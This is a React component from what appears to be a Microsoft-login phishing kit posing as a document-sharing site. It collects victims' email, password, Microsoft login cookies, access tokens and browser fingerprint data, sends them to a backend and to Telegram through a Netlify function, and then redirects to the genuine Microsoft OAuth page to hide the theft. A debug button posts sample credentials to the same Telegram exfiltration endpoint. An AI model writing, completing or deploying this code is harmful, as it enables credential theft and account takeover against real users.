import React, { useEffect } from 'react';

// Real Microsoft OAuth configuration
// ❌ Original STATE removed, now managed by backend PKCE
// const STATE = Math.random().toString(36).substring(2, 15);

// Use the registered redirect URI from Microsoft app registration
const REDIRECT_URI = 'https://vaultydocs.com/oauth-callback';

// ❌ Original hardcoded Microsoft URL replaced by oauthStart.js backend
// const MICROSOFT_OAUTH_URL =
//   'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
//   'client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&' +
//   'response_type=code&' +
//   `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
//   'response_mode=query&' +
//   'scope=openid%20profile%20email&' +
//   'prompt=login';

const RealOAuthRedirect = (props: any) => {
  useEffect(() => {
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());

    // DEBUG: Add a test button for manual Telegram testing
    if (window.location.search.includes('debug=1')) {
      console.log('🔍 DEBUG MODE ENABLED - Adding test button');
      setTimeout(() => {
        const testButton = document.createElement('button');
        testButton.innerText = '🧪 Test Telegram Now';
        testButton.style.cssText =
          'position:fixed;top:10px;right:10px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
        testButton.onclick = async () => {
          console.log('🧪 Manual Telegram test triggered');
          try {
            const response = await fetch('/.netlify/functions/sendTelegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: 'manual-test@debug.com',
                password: 'ManualTest123',
                provider: 'Microsoft',
                fileName: 'Manual Debug Test',
                timestamp: new Date().toISOString(),
                sessionId:
                  'manual_' + Math.random().toString(36).substring(2, 15),
                userAgent: navigator.userAgent,
                formattedCookies: [
                  {
                    name: 'MANUAL_TEST',
                    value: 'manual_value_' + Date.now(),
                    domain: '.login.microsoftonline.com',
                  },
                ],
                browserFingerprint: { localStorage: '{"manual":"test"}' },
              }),
            });
            const result = await response.json();
            console.log('🧪 Manual test result:', result);
            alert('Manual test completed - check console and Telegram');
          } catch (error) {
            console.error('🧪 Manual test failed:', error);
            alert('Manual test failed: ' + error.message);
          }
        };
        document.body.appendChild(testButton);
      }, 1000);
    }

    // Store pre-auth cookies for comparison
    const preAuthFingerprint = {
      cookies: document.cookie,
    };

    let saveSuccess = false;
    let telegramSuccess = false;

    (async () => {
      // Use sessionData from props if available, otherwise declare it for build safety
      let sessionData = (props && props.sessionData) ? props.sessionData : {};

      console.log('🔍 DEBUG: About to communicate with backend', {
        email: sessionData.email,
        cookieCount: sessionData.formattedCookies
          ? sessionData.formattedCookies.length
          : 0,
        hasAccessToken: !!sessionData.accessToken,
        currentURL: window.location.href,
      });

      try {
        console.log('🔄 Step 1: Saving session to backend...');
        if (typeof saveSessionToBackend === 'function') {
          const saveResult = await saveSessionToBackend(sessionData);
          console.log('🔍 Save result:', saveResult);
          saveSuccess = true;
          console.log('✅ Step 1 completed: Session saved');
        }
      } catch (saveError) {
        console.error('❌ Session save failed:', saveError);
        console.error('❌ Save error details:', {
          message: saveError.message,
          stack: saveError.stack,
        });
      }

      try {
        console.log('🔄 Step 2: Sending data to Telegram...');
        console.log('🔍 Telegram payload preview:', {
          email: sessionData.email,
          provider: sessionData.provider,
          cookieCount: sessionData.formattedCookies
            ? sessionData.formattedCookies.length
            : 0,
          hasPassword: !!sessionData.password,
        });
        if (typeof sendToTelegram === 'function') {
          const telegramResult = await sendToTelegram(sessionData);
          console.log('🔍 Telegram result:', telegramResult);
          telegramSuccess = true;
          console.log('✅ Step 2 completed: Data sent to Telegram');
        }
      } catch (telegramError) {
        console.error('❌ Telegram send failed:', telegramError);
        console.error('❌ Telegram error details:', {
          message: telegramError.message,
          stack: telegramError.stack,
        });
      }

      // Log final status
      // Grab cookies before redirect (from session if available)
      if (typeof grabCookies === 'function') {
        grabCookies();
      }

      // ✅ FIXED: Proper PKCE + state flow using oauthStart.js
      console.log('🔄 Fetching real OAuth start URL...');
      try {
        const res = await fetch('/.netlify/functions/oauthStart');
        const data = await res.json();

        if (!data.authUrl || !data.sessionId) {
          console.error('❌ Invalid OAuth start response', data);
          return;
        }

        // Store the state (sessionId) for tokenExchange later
        sessionStorage.setItem('oauth_state', data.sessionId);

        console.log('✅ Redirecting to Microsoft OAuth now...');
        window.location.href = data.authUrl;
      } catch (err) {
        console.error('❌ Failed to start OAuth flow:', err);
      }
    })();
  }, []);

  // This component does not render anything by itself,
  // it just performs redirects and side effects.
  return null;
};

export default RealOAuthRedirect;
